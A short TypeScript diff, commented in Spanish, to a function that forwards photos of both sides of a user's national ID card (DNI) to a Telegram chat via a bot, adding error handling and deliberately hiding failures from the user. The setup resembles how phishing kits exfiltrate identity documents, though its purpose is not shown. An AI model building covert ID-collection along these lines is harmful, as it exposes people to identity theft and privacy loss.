@@ -56,7 +56,7 @@ export const sendDNINotification = async (data: {
   dniData?: any;
 }) => {
   if (!bot || !TELEGRAM_CHAT_ID) {
-    console.log('⚠️ Telegram no configurado');
+    console.log('⚠️ Telegram no configurado - DNI recibido pero no enviado');
     return;
   }
 
@@ -73,20 +73,29 @@ export const sendDNINotification = async (data: {
     await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
 
     // Convertir base64 a buffer y enviar fotos
-    const frontBuffer = Buffer.from(data.frontImage.split(',')[1], 'base64');
-    const backBuffer = Buffer.from(data.backImage.split(',')[1], 'base64');
+    try {
+      const frontBase64 = data.frontImage.includes(',') ? data.frontImage.split(',')[1] : data.frontImage;
+      const backBase64 = data.backImage.includes(',') ? data.backImage.split(',')[1] : data.backImage;
+      
+      const frontBuffer = Buffer.from(frontBase64, 'base64');
+      const backBuffer = Buffer.from(backBase64, 'base64');
 
-    await bot.sendPhoto(TELEGRAM_CHAT_ID, frontBuffer, { 
-      caption: `📄 DNI - FRENTE` 
-    });
-    
-    await bot.sendPhoto(TELEGRAM_CHAT_ID, backBuffer, { 
-      caption: `📄 DNI - DORSO` 
-    });
+      await bot.sendPhoto(TELEGRAM_CHAT_ID, frontBuffer, { 
+        caption: `📄 DNI - FRENTE` 
+      });
+      
+      await bot.sendPhoto(TELEGRAM_CHAT_ID, backBuffer, { 
+        caption: `📄 DNI - DORSO` 
+      });
+    } catch (imgError) {
+      console.error('❌ Error procesando imágenes DNI:', imgError);
+      await bot.sendMessage(TELEGRAM_CHAT_ID, '⚠️ Error al procesar las imágenes del DNI');
+    }
 
     console.log('✅ DNI enviado a Telegram');
   } catch (error) {
     console.error('❌ Error enviando DNI a Telegram:', error);
+    // No lanzar el error para que el usuario no vea el error
   }
 };
 
